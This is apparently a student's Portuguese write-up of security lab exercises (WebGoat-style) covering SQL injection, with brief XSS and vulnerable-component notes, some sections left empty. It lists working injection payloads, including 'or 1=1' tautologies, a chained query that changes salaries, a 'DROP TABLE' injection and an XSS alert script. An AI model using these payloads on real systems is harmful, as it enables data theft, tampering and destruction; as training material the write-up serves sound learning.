### Injection

#### Pergunta 1.1-SQL Injection

##### 2

Retornar o departamento do empregado Bob Franco.

Para tal utilizou se a Query: `SELECT department FROM Employees WHERE first_name='Bob' AND last_name='Franco'`

Resultado obtido : Departamento de marketing.

##### 3

Alterar o departamento do empregado Tobi Barnett para 'Sales'.

Para tal utilizou se a Query: `UPDATE Employees SET department='Sales' WHERE first_name='Tobi' AND last_name='Barnett'`

Resultado obtido : 89762 Tobi Barnett Sales 77000 TA9LL

##### 4

Adicionar a coluna "phone" na tabela "employees".

Para tal utilizou se a Query: `ALTER TABLE Employees ADD phone varchar(20)`

Resultado obtido : ALTER TABLE employees ADD phone varchar(20).

##### 5

Dar permissões a um determinado grupo de utilizadores.

Para tal utilizou se a Query: `GRANT ALTER TABLE TO 'UnauthorizedUser'`

Resultado obtido :  GRANT ALTER TABLE TO UnauthorizedUser.

##### 9-String Sql Injection

Devolver todos os utilizadores da tabela onde os campos foram preenchidos por: 'Smith', 'or' e '1'='1'

Para tal utilizou se a Query: `SELECT * FROM user_data WHERE first_name="John" and last_name='Smith' or '1'='1'`

Resultado obtido : São obtidas todas as entradas da tabela pois 1=1 é uma verdade universal.

##### 10-Numeric Sql Injection

Neste passo retorna-se todos os dados da tabela 'users'. Como *User_Id* é sustetível a SQL Injection elaboramos a query
com Login_Count: 1 e User_Id: 1 or 1=1 como se pode observar em baixo.

Para tal utilizou se a Query: `SELECT * FROM user_data WHERE Login_Count=1 and userid=1 or 1=1`

Resultado obtido : São obtidas todas as entradas da tabela pois 1=1 é uma verdade universal.

##### 11- Comprometer confidencialidade com String Sql Injection

Neste passo obtem-se todos os dados da tabela 'employees'.

Para tal utilizou se a Query: `SELECT * FROM employees WHERE last_name='" + name + "' AND auth_tan= '" + auth_tan + ""`

Resultado obtido :  "You have succeeded!You have successfully compromised the confidentiality of data by viewing internal 
information that you should not have access to. Well done!"

##### 12- Comprometer integridade com Query Chaining

Neste passo, demonstra-se, usando query chaining, como é possível alterar os salários.

Para tal utilizou se a Query: `1' or 1=1; update employees set salary=125000 where first_name='John' and
last_name='Smith';--`

Resultado obtido : "Well done!Now you are earning the most money.And at the same time you sucessfully compromised the integrity
of data by changing the salary!"

##### 13- Comprometer a disponibilidade

Neste passo pretende-se apagar os registos feitos pelo utilizador.

Para tal utilizou se a Query: `Smith'; DROP TABLE access_log;--`

Resultado obtido : Apaga a tabela e todos os dados dentro da mesma.

### XSS

#### Pergunta 1.2-XSS

###  Quebra na Autenticação

#### Pergunta 1.3-Password Reset

### Componentes vulneráveis

#### Pergunta 1.4-Vulnerable components

##### 5

Neste ponto usamos diferentes versões do jquery-ui : jquery-ui:1.10.2 e jquery-ui:1.12.2. Introduzimos o comando
`<script>alert('XSS')</script>` nas duas versões sendo na primeira executado e ,portanto, explorável. Na segunda versão não foi 
executado.

##### 12

Para este passo apenas foi adicionado o comando `<java.lang.Integer>96</java.lang.Integer>`.


